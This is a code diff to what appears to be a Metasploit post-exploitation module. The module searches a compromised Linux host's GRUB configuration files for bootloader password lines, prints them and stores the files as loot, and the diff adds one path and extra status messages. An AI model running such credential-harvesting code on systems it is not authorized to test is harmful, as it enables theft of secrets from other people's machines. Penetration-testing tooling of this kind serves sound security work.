@@ -35,27 +35,35 @@ class MetasploitModule < Msf::Post
       '/etc/grub.d/00_header',
       '/mnt/sysimage/boot/grub.conf',
       '/mnt/boot/grub/grub.conf',
-      '/rpool/boot/grub/grub.cfg'
+      '/rpool/boot/grub/grub.cfg',
+      '/boot/grub2/grub.cfg'
     ]
 
+    print_status("Searching for GRUB config files..")
+    file_found = false
     targets.each do |target|
-      next unless file?(target) and readable?(target)
+      next unless readable?(target)
+      file_found = true
       print_status("Reading #{target}")
       file = read_file(target)
-      found = false
+      password_found = false
       file.each_line do |line|
         line = line.strip
         if line.start_with?("password")
           print_good("Found password: #{line}")
-          found = true
+          password_found = true
         end
       end
 
-      if !found
+      if !password_found
         print_status("No passwords found in GRUB config file: #{target}")
       end
-      file_loc = store_loot("#{target}", "text/plain", session, file)
+      file_loc = store_loot("grub.config", "text/plain", session, file)
       print_good("#{target} saved to #{file_loc}")
+    end
+
+    if !file_found
+      print_bad("No GRUB config files found!")
     end
   end
 end
